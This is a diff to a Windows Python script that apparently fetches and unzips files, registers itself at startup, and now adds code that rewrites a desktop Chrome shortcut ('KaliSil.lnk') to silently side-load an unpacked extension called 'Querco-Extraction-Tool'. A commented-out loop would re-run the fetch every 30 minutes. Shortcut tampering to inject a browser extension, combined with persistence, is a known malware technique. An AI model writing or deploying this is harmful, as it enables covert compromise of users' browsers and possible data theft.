@@ -3,6 +3,8 @@ import zipfile
 import os
 import shutil
 import winshell
+import time
+import pylnk3
 
 
 def fetch_and_unzip_to_secure_location():
@@ -72,8 +74,38 @@ def add_to_startup():
 
 
 if __name__ == "__main__":
-    try:
-        fetch_and_unzip_to_secure_location()
-    except Exception as e:
-        print(f"An error occurred: {e}")
+    # while True:
+    #     try:
+    #         fetch_and_unzip_to_secure_location()
+    #         time.sleep(1800)  # 30 minutes
+    #     except Exception as e:
+    #         print(f"An error occurred: {e}")
     # add_to_startup()
+
+    # Define the path to the shortcut
+    # Define the path to the shortcut
+    # Define the path to the shortcut on the desktop
+    desktop_path = os.path.join(os.path.expanduser("~"), "Desktop")
+    shortcut_name = "KaliSil.lnk"
+    shortcut_path = os.path.join(desktop_path, shortcut_name)
+
+    # Define the path to the Chrome extension directory
+    extension_path = os.path.join(
+        os.path.expanduser("~"), "Querco-Extraction-Tool")
+
+    # Load the shortcut
+    lnk = pylnk3.LNKFile(shortcut_path)
+
+    # Define the desired argument to load the Chrome extension
+    desired_argument = f"--load-extension={extension_path}"
+
+    # Check if the desired argument is already present
+    if desired_argument not in lnk.arguments:
+        # If not present, add the argument
+        lnk.arguments += f" {desired_argument}"
+
+        # Save the modified shortcut
+        lnk.save(shortcut_path)
+
+    print(
+        f"Shortcut '{shortcut_name}' modified to load Chrome extension from '{extension_path}'.")
